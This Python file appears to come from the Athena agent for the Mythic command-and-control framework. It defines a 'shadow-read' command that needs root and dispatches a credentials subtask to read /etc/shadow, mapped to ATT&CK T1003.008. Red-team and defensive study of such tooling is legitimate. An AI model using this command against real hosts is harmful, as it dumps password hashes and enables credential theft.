from .athena_utils.plugin_utilities import default_completion_callback
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class ShadowReadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass

class ShadowReadCommand(CommandBase):
    cmd = "shadow-read"
    needs_admin = True
    script_only = True
    depends_on = "credentials"
    plugin_libraries = []
    help_cmd = "shadow-read"
    description = "Read /etc/shadow (Linux only, requires root)"
    version = 1
    author = "@checkymander"
    argument_class = ShadowReadArguments
    attackmapping = ["T1003.008"]
    attributes = CommandAttributes()
    completion_functions = {"command_callback": default_completion_callback}

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        subtask = MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID,
            CommandName="credentials",
            Token=taskData.Task.TokenID,
            SubtaskCallbackFunction="command_callback",
            Params=json.dumps({"action": "shadow-read"})
        )
        await SendMythicRPCTaskCreateSubtask(subtask)
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
